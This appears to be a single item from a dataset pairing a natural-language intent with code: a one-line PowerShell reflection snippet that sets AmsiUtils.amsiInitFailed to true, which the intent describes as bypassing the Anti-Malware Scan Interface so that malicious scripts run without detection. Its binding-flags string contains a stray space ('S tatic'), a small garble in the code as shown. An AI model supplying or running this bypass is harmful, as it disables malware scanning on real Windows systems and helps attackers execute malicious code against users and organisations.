# Natural language intent:
# Bypassing AMSI (Anti-Malware Scan Interface), Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,S tatic').SetValue($null,$true)
